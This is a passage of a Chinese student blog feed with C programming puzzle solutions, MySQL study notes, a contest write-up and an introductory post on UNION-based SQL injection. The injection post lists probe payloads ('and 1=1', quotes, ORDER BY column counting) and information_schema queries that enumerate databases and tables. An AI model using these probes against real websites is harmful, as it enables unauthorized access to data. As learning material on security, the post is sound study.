        <content type="html"><![CDATA[<h1 id="假币问题"><a href="#假币问题" class="headerlink" title="假币问题"></a>假币问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>利有 12 枚银币。其中有 11 枚真币和 1 枚假币。假币看起来和真币没有区别，但是重量不同。但赛利不知道假币比真币轻还是重。于是他向朋友借了一架天平。朋友希望赛利称三次<br>就能找出假币并且确定假币是轻是重。例如:如果赛利用天平称两枚硬币，发现天平平衡，说明两枚都是真的。如果赛利用一枚真币与另一枚银币比较，发现它比真币轻或重，说明它是假币。经过精心安排每次的称量，赛利保证在称三次后确定假币。</p><p><em>Input：</em></p><p>输入有三行，每行表示一次称量的结果。赛利事先将银币标号为 A-L。每次称量的结果用三个以空格隔开的字符串表示： 天平左边放置的硬币 天平右边放置的硬币 平衡状态。 其中平衡状态用，up, down, 或 even表示, 分别为右端高、右端低和平衡。天平左右的硬币数总是相等的。</p><p><em>Output：</em></p><p>输出哪一个标号的银币是假币，并说明它比真币轻还是重(heavy or light)。<br>Sample Input<br>1<br>ABCD EFGH even<br>ABCI EFJK up<br>ABIJ EFGH even<br>Sample Output<br>K is the counterfeit coin and it is light</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>核心（枚举）</p><p>首先，每一个标号的银币都可能是假币，所以需要对每个银币都进行分析，其次题目没说假币是更重还是更轻，所以又要再分俩种情况。</p><p>具体实现则是，读入三次称重结果，对每一枚银币，分更重和更轻俩种情况讨论，看哪种符合读入的结果。</p><p>比如这次的输入，ABCD EFGH even,说明假币不可能在这8枚银币里，但程序仍会对A-H进行分析，再分析I，先假设I更轻，第二个就不满足了，因为up表示右边高，I排除，再分析J，同样<br>先假设J更轻，第三个就不满足了，最后剩一个K，先假设更轻，刚好满足第二个条件。</p><p>所以程序需要实现的就是这三个过程，遍历A-L，假币更重比较一次，假币更轻比较一次。</p><p>用到了strchr(const char str[], int c)，如果在字符串 str 中找到字符 c，则函数返回指向该字符的指针，如果未找到该字符则返回 NULL。假币在天平上肯定出现不平衡，所以找出事先假设好的假币在哪边，再判断。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="C">#define _NO_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;string.h&gt;char left[3][7];//天平左边的银币char right[3][7];//天平右边的银币char result[3][7];//称量结果bool isCounterfeitCoin(char iCoin, bool isLight);int main()&#123;    int t;    scanf(&quot;%d&quot;, &amp;t);//t组数据，一组三次    while (t--) &#123;        for (int i = 0; i &lt; 3; i++)            scanf(&quot;%s %s %s&quot;, &amp;left[i], &amp;right[i], &amp;result[i]);        //枚举每个银币        for(char iCoin = &#39;A&#39;; iCoin &lt;= &#39;L&#39;; iCoin++)            if (isCounterfeitCoin(iCoin, true)) &#123;                printf(&quot;%c is the counterfeit coin and it is light.\n&quot;, iCoin);                break;            &#125;            else if (isCounterfeitCoin(iCoin, false)) &#123;                printf(&quot;%c is the counterfeit coin and it is heavy.\n&quot;, iCoin);                break;            &#125;    &#125;    return 0;&#125;bool isCounterfeitCoin(char iCoin, bool isLight)/*isLight为真则表示假币为轻，否则假币为重*/&#123;    for (int i = 0; i &lt; 3; ++i) &#123;        //指向天平俩边的字符串        char* pleft;        char* pright;        if (isLight) &#123;            pleft = left[i];            pright = right[i];        &#125;        else &#123; /*如果假设假币是重的isLight为假的，则把称量结果左右对换*/            pleft = right[i];            pright = left[i];        &#125;        switch (result[i][0]) &#123;/*天平右边的情况*/            case &#39;u&#39;: // up                if (strchr(pright, iCoin) == NULL)                    return false;                break;            case &#39;e&#39;: //even                if (strchr(pleft, iCoin) || strchr(pright, iCoin))                    return false;                break;            case &#39;d&#39;:                if (strchr(pleft, iCoin) == NULL)                    return false;                break;        &#125;    &#125;        return true;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/24/9rDY8LeZRhTmzb6.png" alt="image.png"></p><h1 id="跳绳为题-参考自："><a href="#跳绳为题-参考自：" class="headerlink" title="跳绳为题(参考自：)"></a>跳绳为题(参考自：)</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>朋友玩跳绳比赛,要计算在一分钟内跳了多少下.假设每秒钟跳一下,如果中途失败了,则要<br>花三秒钟后才能开始重跳.一般小朋友跳绳一分钟要跳坏好几次.现在给出小朋友每次跳坏时<br>已经跳的总数,求小朋友在一分钟内跳了多少下.(请注意分析示例数据.)</p><p><em>Input:</em></p><p>第一行为 n 个小朋友<br>其余各行,每行第一个整数是跳坏的次数 m,其余 m 个整数是跳坏时累计跳了多少下.</p><p><em>Output:</em></p><p>输出相应小朋友头一分钟内跳了多少下.</p><p>Sample Input</p><p>603<br>12 23 451 17<br>4 10 20 30 40<br>5 10 20 30 40 58<br>6 10 20 30 40 47 60</p><p>Sample Output</p><p>60<br>51<br>57<br>48<br>48<br>47<br>Hint</p><p>提示,在跳绳比赛时,你可能已经超时了,但自己还在计数,但裁判已经停止计时并得到成绩.<br>这里相当与自己计数.因此,并非跳坏的时候都是在前一分钟以内.请注意分析示例数据</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre><code class="C">#include&lt;stdio.h&gt;int main()&#123;    int n, m, x, i, ok, time, s;    scanf(&quot;%d&quot;, &amp;n);    while (n--)    &#123;        time = ok = s = 0;        scanf(&quot;%d&quot;, &amp;m);        for (i = 0; i &lt; m; ++i)        &#123;            scanf(&quot;%d&quot;, &amp;x);            time = x + 3 * i;//每次停下来后已经用的时间            if (ok == 0)//未超过一分钟...            &#123;                if (time &gt;= 57)                &#123;                    ok = 1;                    time = (time &gt; 60) ? 60 : time;//最多跳60次                    s = time - 3 * i;                    //剩余的时间不够下一次重新跳了                    //跳的次数等于用的时间减去停下来消耗的时间                 &#125;                else if (time &lt; 57 &amp;&amp; i == m - 1)                    //最后一次停下来，但是不够60s                 &#123;                    s = 60 - 3 * (i + 1);                    //这一次后面肯定还要有三秒停下来的时间                 &#125;            &#125;        &#125;        printf(&quot;%d\n&quot;, (m == 0) ? 60 : s);//特判未停下来的情况    &#125;    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/25/62vp1H7AQYmB9TW.png" alt="image.png"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联合查询输入</title>
      <link href="/2023/03/18/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BE%93%E5%85%A5/"/>
      <url>/2023/03/18/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="联合查询注入-来自：sechub"><a href="#联合查询注入-来自：sechub" class="headerlink" title="联合查询注入 来自：sechub"></a>联合查询注入 来自：sechub</h1><h2 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h2><p>我们可能存在SQL注入变量的后边添加以下payload：</p><ul><li>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整型判断）</li><li>单引号判断’显示数据库错误信息或者页面回显不同（整型，字符串类型判断）</li><li>\ (转义符)</li><li>-1 &#x2F; +1 回显下一个或上一个页面 （整型判断）</li></ul><p>注：加号’+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p><h2 id="2-判断是整型注入还是字符型注入"><a href="#2-判断是整型注入还是字符型注入" class="headerlink" title="2.判断是整型注入还是字符型注入"></a>2.判断是整型注入还是字符型注入</h2><p>数字型与字符型的最大区别在于：<br>    数字类型不需要引号闭合，而字符类型需要使用引号闭合。</p><p>数字型：</p><pre><code class="SQL">select * from table where id = 1;</code></pre><p>字符型:</p><pre><code class="SQL">select * from table where username = &#39;admin&#39;;</code></pre><h2 id="3-根据不同的分类进行注入"><a href="#3-根据不同的分类进行注入" class="headerlink" title="3.根据不同的分类进行注入"></a>3.根据不同的分类进行注入</h2><p>根据SQL注入语法分类：</p><ul><li>UNION query SQL injection(可联合查询注入)</li><li>Error-based SQL injection(报错型注入)</li><li>Boolean-based blind SQL injection(基于布尔型注入)</li><li>Time-based blind SQL injection(基于时间延迟注入)</li><li>Stacked queries SQL injection(可多语句查询注入)</li></ul><h3 id="3-1-MySQL中UNION使用规则"><a href="#3-1-MySQL中UNION使用规则" class="headerlink" title="3.1 MySQL中UNION使用规则"></a>3.1 MySQL中UNION使用规则</h3><p>UNION的作用时间俩个或多个select语句查询结果合并起来</p><ul><li>UNION必须由俩条或俩条以上的select语句组成，语句之间用UNION分隔</li><li>UNION中的每个查询的列数必须相同</li><li>UNION会从查询结果集中自动去除重复行</li></ul><h3 id="3-2-判断查询列数"><a href="#3-2-判断查询列数" class="headerlink" title="3.2 判断查询列数"></a>3.2 判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照制定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段位1，第二个位2，以此类推，我们可以通过二分猜解列数。<br>例：</p><p>order by 1</p><p>order by 20</p><p>order by 10</p><h3 id="3-3-获取所有数据库名"><a href="#3-3-获取所有数据库名" class="headerlink" title="3.3 获取所有数据库名"></a>3.3 获取所有数据库名</h3><p>group_concat()一次性显示：</p><pre><code class="SQL">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>limit逐一显示：</p><pre><code class="SQL">select count(SCHEMA_NAME) FROM information_schema.schemata #查询数据库个数select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</code></pre><h3 id="3-4-获取数据库-test-所有表名"><a href="#3-4-获取数据库-test-所有表名" class="headerlink" title="3.4 获取数据库(test)所有表名"></a>3.4 获取数据库(test)所有表名</h3><p>group_concat()一次性显示：</p><pre><code class="SQL">select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema=&#39;test&#39;;</code></pre><p>limi 逐一显示</p><pre><code class="SQL">select count(TABLE_NAME) from information_schema.TABLES where table_schema=&#39;test&#39;;select TABLE_NAME from information_schema.SCHEMATA where table_schema=&#39;test&#39; limit 0,1</code></pre><h2 id="4-联合查询"><a href="#4-联合查询" class="headerlink" title="4.联合查询"></a>4.联合查询</h2><p>前提条件：页面上有显示位</p><p>什么是显示位？</p><p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫<em>显示位</em></p><h2 id="5-过程"><a href="#5-过程" class="headerlink" title="5.过程"></a>5.过程</h2><p><img src="https://s2.loli.net/2023/03/18/3TneEwuYtpIokxd.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习笔记</title>
      <link href="/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><pre><code class="SQL">mysql -u root -p123456 --登陆时密码-p后不能有空格update mysql.user set authentication_string=password(&#39;123456&#39;) where user=&#39;root&#39; and Host = &#39;localhost&#39;; --修改用户密码flush privileges; -- 刷新权限所有语句结尾都是用;结尾show databases; -- 查看所有数据库mysql&gt; use home -- 切换数据库 use 数据库名show tables; -- 查看数据库中所有的表describe student; -- 显示数据库中所有信息</code></pre><p><img src="https://s2.loli.net/2023/03/12/PlXSLUocQie21Wz.png" alt="image.png"></p><pre><code class="SQL">create database westos; -- 创建一个数据库exit; -- 退出连接-- 单行注释(SQL的本来的注释)/*SQL多行注释123*/</code></pre><p>数据库xxx语言 CRUD增删改查</p><p>DDL 定义</p><p>DML 操作</p><p>DQL 查询</p><p>DCL 控制</p><h1 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h1><p>操作数据库-&gt;操作数据库中的表-&gt;操作数据库中表的数据</p><p>mysql 关键字不区分大小写 </p><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1. 创建数据库"></a>1. 创建数据库</h2><pre><code class="SQL">CREATE DATABASE IF NOT EXISTS westos;</code></pre><h2 id="2-删除数据库"><a href="#2-删除数据库" class="headerlink" title="2. 删除数据库"></a>2. 删除数据库</h2><pre><code class="SQL">DROP DATABASE IF EXISTS westos;</code></pre><h2 id="3-使用数据库"><a href="#3-使用数据库" class="headerlink" title="3. 使用数据库"></a>3. 使用数据库</h2><pre><code class="SQL">-- tab键上面，如果你的表名或者字段名时一个特殊字符，就需要带 ( ` )USE home;</code></pre><p><img src="https://s2.loli.net/2023/03/12/Ew4zWRp1nCgAbIv.png" alt="image.png"></p><h2 id="4-查看数据库"><a href="#4-查看数据库" class="headerlink" title="4. 查看数据库"></a>4. 查看数据库</h2><pre><code class="SQL">SHOW DATABASES; --查看所有数据可</code></pre><p>学习思路<br>    - 对照SQLyog可视化，然后在历史记录里查看<br>    - 固定的语法或关键字必须强行记住</p><h1 id="数据库的数据类型"><a href="#数据库的数据类型" class="headerlink" title="数据库的数据类型"></a>数据库的数据类型</h1><h2 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h2><ul><li>tinyint 十分小的数据 1个字节</li><li>smallint 较小的数据  2个字节</li><li><strong>int 标准的整数  4个字节</strong></li><li>bigint 较大的数据 8个字节</li><li>float 浮点数 4个字节 </li><li>double 浮点数 8个字节 （精度问题）</li><li>decimal 字符串形式的浮点数 金融计算一般使用decimal</li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li>char 字符串 固定大小 0-255</li><li><strong>varchar 可变长字符串 0-65535</strong> 常用的变量 String</li><li>tinytext 微型文本 2^8 - 1 </li><li>text 文本串 2^16 - 1 保存大文本</li><li></li></ul><h2 id="时间日期"><a href="#时间日期" class="headerlink" title="时间日期"></a>时间日期</h2><ul><li>date YYYY-MM-DD，日期格式</li><li>time HH:mm:ss 时间格式 </li><li><strong>datetime 最常用的时间格式</strong></li><li><strong>timestamp 时间戳,1970.1.1 到现在的毫秒数！</strong></li><li>year 年份</li></ul><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><ul><li>没有值或未知<br><strong>注意， 不要使用null进行运算，结果位NULL</strong></li></ul><h1 id="数据库的字段属性"><a href="#数据库的字段属性" class="headerlink" title="数据库的字段属性"></a>数据库的字段属性</h1><p><em>Unsigned</em>:</p><ul><li>无符号的整数</li><li>声明了该列不能声明为负数</li></ul><p><em>zerofill</em>:</p><ul><li>0填充的</li><li>不足的位数，使用0来填充，int(3), 5—005</li></ul><p> <em>自增</em></p><ul><li>通常理解为，自动在上一条记录的基础上+1（默认）</li><li>通常用来设计唯一的主键-index，必须是整数类型</li><li>可以自定义设计主键自增的起始值和步长</li></ul><p> <em>非空 Null not null</em></p><ul><li>假设设施为not null，如果不给它赋值，就会报错！</li><li>NULL,如果不填值，默认为NULL</li></ul><p> <em>默认</em> </p><ul><li>设置默认值</li><li>sex，比如默认值为男，如果不指定该列的值，则默认为男</li></ul><h3 id="student-1"><a href="#student-1" class="headerlink" title="student 1"></a>student 1</h3><pre><code class="SQL">-- 目标：创建一个scahool数据库-- 创建学生表（列，字段） 使用SQL创建-- 学号int 登陆密码varchar（20） 姓名，性别varcahr（2），出生日期（datatime），家庭住址，email-- 注意点，使用英文（），表的名称和字段尽量用``括起来-- AUTO_INCREMENT 自增-- 字符串使用单引号括起来！-- 所有的语句后面加,(英文的)，最后一个不用加-- primary key ,主键一般一个表只有一个唯一的主键CREATE TABLE IF NOT EXISTS `student3` (   `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT &#39;学号&#39;,   `name` VARCHAR(30) NOT NULL DEFAULT &#39;匿名&#39; COMMENT &#39;姓名&#39;,   `password` VARCHAR(20) NOT NULL DEFAULT &#39;123456&#39; COMMENT &#39;密码&#39;,   `sex` VARCHAR(2) NOT NULL DEFAULT &#39;无&#39; COMMENT &#39;性别&#39;,   `birthday` DATETIME DEFAULT NULL COMMENT &#39;出生日期&#39;,   `address` VARCHAR(30) DEFAULT NULL COMMENT &#39;家庭住址&#39;,   `email` VARCHAR(50) DEFAULT NULL COMMENT &#39;邮箱&#39;,   PRIMARY KEY (`id`)) ENGINE=INNODB DEFAULT CHARSET=utf8;-- 这个冒号在SQLyog可加可不加</code></pre><p> <strong>格式</strong></p><pre><code class="SQL">create table [if not exists] `表名`(   &#39;字段名1&#39; 列类型 [属性][索引][注释],   &#39;字段名2&#39; 列类型 [属性][索引][注释],   #...   &#39;字段名n&#39; 列类型 [属性][索引][注释])[表类型][表字符集][注释];</code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre><code class="SQL">SHOW CREATE DATABASE school -- 查看创建数据库的语句SHOW CREATE TABLE student -- 查看student数据表的定义语句DESC student -- 显示表的结构</code></pre><h2 id="数据表的类型"><a href="#数据表的类型" class="headerlink" title="数据表的类型"></a>数据表的类型</h2><pre><code class="SQL">-- 关于数据库引擎/*INNODB 默认使用~MYISAM 早些年使用的*/</code></pre><table><thead><tr><th></th><th>MYISAM</th><th>INNODB</th></tr></thead><tbody><tr><td>事务支持</td><td>不支持</td><td>支持</td></tr><tr><td>数据行锁定</td><td>不支持</td><td>支持</td></tr><tr><td>外键约束</td><td>不支持</td><td>支持</td></tr><tr><td>全文索引</td><td>支持</td><td>不支持</td></tr><tr><td>表空间大小</td><td>较小</td><td>较大，约为2倍</td></tr><tr><td>常规使用操作：</td><td></td><td></td></tr></tbody></table><ul><li>MYISAM 节约空间，速度较快</li><li>INNODB 安全性高，多表多用户操作</li></ul><p> 在物理空间的位置:<br> 所有的数据库文件都在data目录下<br> 本质还是文件的存储</p><p> MySQL引擎在物理文件上的去呗</p><ul><li>InnoDB 在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1文件</li><li>MYISAM<ol><li>*.frm 表结构的定义文件</li><li>*.MYD 数据文件（data) </li><li>*myi 索引文件(index)<br>  设置数据库表的字符集编码</li></ol></li></ul><pre><code class="SQL">CHARSET=utf8</code></pre><p><em>不设置的话，会时MySQL默认的字符集（不支持中文）</em><br>MySQL的默认便把时Latin1<br>可在my.ini修改</p><h2 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h2><pre><code class="SQL">alter table teacher rename as teacher1； -- 修改表名alter table teacher1 add age int(11)； -- 增加字段</code></pre><h3 id="修改表的字段-重命名，修改约束！"><a href="#修改表的字段-重命名，修改约束！" class="headerlink" title="修改表的字段(重命名，修改约束！)"></a>修改表的字段(重命名，修改约束！)</h3><pre><code class="SQL">alter table teacher1 modify age varchar(11); -- 修改约束alter table teacher1 change age age1 int(1); -- 字段重命名-- change 用来字段重命名，不能修改字段类型和约束-- modify 不用来字段重命名，之恶能修改类型和约束</code></pre><h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><pre><code class="SQL">alter table teacher1 drop age; -- 删除表的字段drop table if exists teacher1p; -- 删除整个表</code></pre><p><em>所有的创建和和三处操作尽量加上判断，以免报错</em></p><p>注意点:</p><ul><li>&#96;&#96;字段名用这个包裹</li><li>注释– &#x2F;**&#x2F;</li><li>sql关键字大小写不敏感，建议小写</li><li>所有的符号用英文</li></ul><h1 id="Mysql的数据管理"><a href="#Mysql的数据管理" class="headerlink" title="Mysql的数据管理"></a>Mysql的数据管理</h1><h2 id="3-1-外键-了解即可"><a href="#3-1-外键-了解即可" class="headerlink" title="3.1. 外键(了解即可"></a>3.1. 外键(了解即可</h2><p>方式一:在创建表的时候，增加约束</p><pre><code class="SQL">-- 学生表的gradeid字段，要去引用年级表的gradeid-- 定义外键key-- 给这个外键添加约束 (执行引用) references 引用CREATE TABLE IF NOT EXISTS `student` (    `id` INT(4) NOT NULL AUTO_INCREMENT COMMENT &#39;学号&#39;,    `name` VARCHAR(30) NOT NULL DEFAULT &#39;匿名&#39; COMMENT &#39;姓名&#39;,    `password` VARCHAR(20) NOT NULL DEFAULT &#39;123456&#39; COMMENT &#39;密码&#39;,    `sex` VARCHAR(2) NOT NULL DEFAULT &#39;无&#39; COMMENT &#39;性别&#39;,    `birthday` DATETIME DEFAULT NULL COMMENT &#39;出生日期&#39;,    `address` VARCHAR(30) DEFAULT NULL COMMENT &#39;家庭住址&#39;,    `email` VARCHAR(50) DEFAULT NULL COMMENT &#39;邮箱&#39;,    PRIMARY KEY(`id`)    KEY `FK_gradeid` (`gradeid`)    constraint `FK_gradeid` foreign key(`gradeid`) references `grade` (`gradeid`)) ENGINE=INNODB DEFAULT CHARSET=utf8;</code></pre><p>方式二: 创建表成功后，没有外键关系</p><pre><code class="SQL">-- 创建表的时候没有外键关系alter table `student`add constaint `FK_gradeid` foreign key(`gradeid`) references `grade` (`gradeid`);</code></pre><p>删除有外键关系的表的时候，必须要先删除引用别人的表（从表），再删除主表</p><p>以上的操作都是物理外键，数据库级别的外键，我们不建议使用！（避免数据库过多困扰）</p><p><em>最佳实践</em></p><ul><li>数据库就是单纯的表，只用来存数据，只有行（数据）和列（字段）</li><li>我们想使用多张表的数据，想使用外键（程序去使用）</li><li></li></ul><h2 id="3-2-DML语言-全部记住"><a href="#3-2-DML语言-全部记住" class="headerlink" title="3.2. DML语言(全部记住)"></a>3.2. DML语言(全部记住)</h2><p>数据库意义:数据存储、数据管理<br>DML语言：数据操作语言</p><ul><li>insert</li><li>update</li><li>delet</li></ul><h3 id="3-2-1-添加insert"><a href="#3-2-1-添加insert" class="headerlink" title="3.2.1 添加insert"></a>3.2.1 添加insert</h3><pre><code class="SQL">-- 插入语句（添加）-- insert into 表名([字段名1，字段2，字段3])values(&#39;值1&#39;),(&#39;值2&#39;)....insert into `grade`(`gradename`) values(`大四`);--由于主键自增，我们可以省略(如果不写表的字段就会一一匹配)insert into `grade` values(&#39;大三&#39;);-- 一般写插入语句，我们一定要数据和字段一一对应！-- 插入多个字段insert into `grade`(`gradename`) values(&#39;大二&#39;),(&#39;大一&#39;,)insert into `student`(`name`) values (&#39;张三&#39;)insert into `student`(`name`,`pwd`,`sex`) values(&#39;李四&#39;,&#39;aaaaa&#39;,&#39;男&#39;)insert into `student` values (5,&#39;李四&#39;,&#39;男&#39;,&#39;2001-02-01&#39;,1,&#39;西安&#39;,&#39;Email&#39;)</code></pre><p>注意：</p><ul><li>字段和字段之间使用英文逗号隔开</li><li>字段是可以省略的，但是后面的值必须一一对应</li><li>可以同时插入多条数据，values后面的值，需要使用逗号隔开</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛客小白赛68失败经验</title>
      <link href="/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="参赛经历"><a href="#参赛经历" class="headerlink" title="参赛经历"></a>参赛经历</h1><p>本来是去初学者试炼营，偶然点进小白赛，发现参赛的方式不是很复杂，蛮试一下</p><h1 id="A题"><a href="#A题" class="headerlink" title="A题"></a>A题</h1><h2 id="Tokitsukaze-and-New-Operation"><a href="#Tokitsukaze-and-New-Operation" class="headerlink" title="Tokitsukaze and New Operation"></a>Tokitsukaze and New Operation</h2><p><img src="https://s2.loli.net/2023/03/12/GaZ1gIvte2FpdSi.png" alt="1.png"><br><img src="https://s2.loli.net/2023/03/12/n7ZzfrcdYVL4lyU.png" alt="2.png"></p><p>我的思路是用模10，除10的方法遍历每位数，再去做，途中也遇到很多问题，相乘小于10，要乘的10的不同次方，在解决种种问题后，自测运行过了</p><h3 id="判断位数是否一致"><a href="#判断位数是否一致" class="headerlink" title="判断位数是否一致"></a>判断位数是否一致</h3><pre><code class="C">int istrue(int x, int y)&#123;    int countx = 0;    int county = 0;    do    &#123;        x = x / 10;        countx++;    &#125;while (x != 0);    do    &#123;        y = y / 10;        county++;    &#125;while (y != 0);    if (countx == county)        return 1;    else        return 0;&#125;</code></pre><h3 id="计算各位数相乘"><a href="#计算各位数相乘" class="headerlink" title="计算各位数相乘"></a>计算各位数相乘</h3><pre><code class="C">int cacux(int x, int y)&#123;    int count = 0;    int num = x;//注意x的值不能变，引入变量     do    &#123;        num = num / 10;        count++;    &#125;while (num != 0);    //printf(&quot;%d\n&quot;, count);    int i = 0;    int ret = 0;    int j = 0;    for (i = 0; i &lt; count; i++)    &#123;        ret += (x % 10) * (y % 10) * pow(10, j);        if ((x % 10) * (y % 10) &lt; 10)            j = j + 1;        else            j = j + 2;        x = (x - (x % 10)) / 10;        y = (y - (y % 10)) / 10;        //printf(&quot;%d %d %d\n&quot;, ret, x, y);        //为0的话就不能往上，&lt;10              &#125;    return ret;&#125;</code></pre><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><pre><code class="C">int main()&#123;    int num = 0;    scanf(&quot;%d&quot;, &amp;num);    int i = 0;    int x = 0;    int y = 0;    int a[100] = &#123;0&#125;;    for (i = 0; i &lt; num; i++)    &#123;        scanf(&quot;%ld %ld&quot;, &amp;x, &amp;y);        if (istrue(x, y) == 1)        &#123;            a[i] = cacux(x, y);         &#125;        else            a[i] = -1;            &#125;    for (i = 0; i &lt; num; i++)    &#123;        printf(&quot;%d\n&quot;, a[i]);    &#125;    return 0;&#125;</code></pre><h3 id="自测运行"><a href="#自测运行" class="headerlink" title="自测运行"></a>自测运行</h3><p><img src="https://s2.loli.net/2023/03/12/Darzk5UVZu7MGf2.png" alt="3.png"></p><p>后面也找出问题了,数字太大越界了，尝试了long long还是不行,看了别人的解答发现根本看不懂。</p><p>😩</p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学生基本信息输入输出引发的思考</title>
      <link href="/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="BC11-学生基本信息输入"><a href="#BC11-学生基本信息输入" class="headerlink" title="BC11 学生基本信息输入"></a>BC11 学生基本信息输入</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述:"></a>描述:</h2><p>依次输入一个学生的学号，以及3科（C语言，数学，英语）成绩，在屏幕上输出该学生的学号，3科成绩（注：输出成绩时需进行四舍五入且保留2位小数）。</p><h2 id="数据范围："><a href="#数据范围：" class="headerlink" title="数据范围："></a>数据范围：</h2><p>学号满足 1≤n≤20000000,各科成绩使用百分制，且不可能出现负数</p><h2 id="输入描述："><a href="#输入描述：" class="headerlink" title="输入描述："></a>输入描述：</h2><p>学号以及3科成绩，学号和成绩之间用英文分号隔开，成绩之间用英文逗号隔开。</p><h2 id="输出描述："><a href="#输出描述：" class="headerlink" title="输出描述："></a>输出描述：</h2><p>学号，3科成绩，输出格式详见输出样例。</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>在开始读入数据时，刚想用int存储学号，想到int能够存取整数的范围，它存的下吗？</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    printf(&quot;int size is %d byte.\n&quot; , sizeof(int));    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/12/ZcQwRAYFfjDimXl.png" alt="image.png"></p><p>实际上int的取值范围依赖于计算机系统,这里显示的4Byte，说明可以存取的数字范围是-2147483648～2147483647机2^32 ~ 2^32 - 1,所以用int类型就够了。</p><p>剩下的三个数用float即可，但题目又有要求要四舍五入，如果直接用%.2f的形式他会自动四舍五入吗，搜索资料后，答案有的说会，有的又说不会，我自己试了下是可以的，但有的人说不可以，虽然提交OJ是过了，但还是想写个四舍五入的方法，可以采用放大取余再看余数的范围。因为有三个数需要处理，所以我就写一个函数来解决问题</p><pre><code class="C">#include &lt;stdio.h&gt;//三位小数,我就直接先让它放大1000倍 float test(float a)&#123;    int b = a * 1000;    int tmp = 10;    while (tmp &gt;= 10)    &#123;        tmp = b % 10;    &#125;    if (tmp &lt; 5)    &#123;        a = (float)(b - tmp) / 1000;         return a;    &#125;     else    &#123;        a = (float)(b + 10 - tmp) / 1000;        return a;    &#125;&#125;int main()&#123;    float a = 80.635;    float b = 80.630;    printf(&quot;%.2f\n&quot;, test(a));    printf(&quot;%.2f\n&quot;, test(b));    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/12/7POT96axM8cILXS.png" alt="image.png"></p><p>附上全代码:</p><pre><code class="C">#include &lt;stdio.h&gt;float test(float a) &#123;    int b = a * 1000;    int tmp = 10;    while (tmp &gt;= 10) &#123;        tmp = b % 10;    &#125;    if (tmp &lt; 5) &#123;        a = (float)(b - tmp) / 1000;        return a;    &#125; else &#123;        a = (float)(b + 10 - tmp) / 1000;        return a;    &#125;&#125;int 